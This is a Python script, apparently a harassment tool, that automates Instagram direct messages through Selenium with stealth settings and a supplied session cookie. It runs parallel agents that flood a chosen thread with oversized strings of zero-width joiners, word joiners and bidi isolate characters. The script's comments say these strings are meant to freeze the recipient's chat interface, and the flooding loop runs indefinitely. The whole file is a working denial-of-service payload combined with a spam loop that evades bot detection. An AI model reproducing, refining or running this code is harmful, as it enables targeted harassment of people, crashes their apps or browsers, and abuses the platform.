# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (MATRIX-STUCK V40)
# 📅 STATUS: CHAT-UI-FREEZE | 4-AGENT TOTAL | DOM-EXHAUSTION

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.2, 0.5)    # ✅ Slightly slower burst to ensure the 'ENTER' registers
SESSION_LIMIT = 180       
REST_AFTER_STRIKES = 80    
REST_DURATION = 5          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_stuck_payload():
    """Generates a mathematically 'Unbreakable' block to freeze the DOM."""
    u_id = random.randint(1000, 9999)
    # \u2060 = Word Joiner (The Glue)
    # \u2068 = Isolate (The Layer)
    # \u200D = ZWJ (The Shaper Attack)
    glue, iso, zwj, pop = "\u2060", "\u2068", "\u200D", "\u2069"
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [STUCK_ID:{u_id}]"
    
    # We create a single, massive string with no spaces.
    # The browser's C++ core will hang trying to find a line-break.
    body = []
    for i in range(350):
        # Every line is bonded to the next with 'glue' (\u2060)
        line = f"{iso}PRAVEER{zwj}PAPA{zwj}ON{zwj}TOP{zwj}🌙{i}{pop}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def force_atomic_send(driver, text):
    """Fires a JS event that bypasses the browser's input queue."""
    try:
        # We use a 'Mutation Observer' bypass to force the message into the chat socket
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                // Clear and Insert
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                document.execCommand('insertText', false, arguments[0]);
                
                // Force-trigger the 'Input' and 'Enter' events
                box.dispatchEvent(new Event('input', { bubbles: true }));
                var enterEvent = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true
                });
                box.dispatchEvent(enterEvent);
            }
        """, text)
        return True
    except:
        return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        driver = get_driver(agent_id)
        try:
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            strike_count = 0
            while True:
                payload = get_stuck_payload()
                if force_atomic_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Matrix-Lock ({GLOBAL_SENT})")
                    
                    if strike_count % 50 == 0:
                        # Periodic Refresh to prevent YOUR bot from getting stuck
                        driver.refresh()
                        time.sleep(10)
                
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
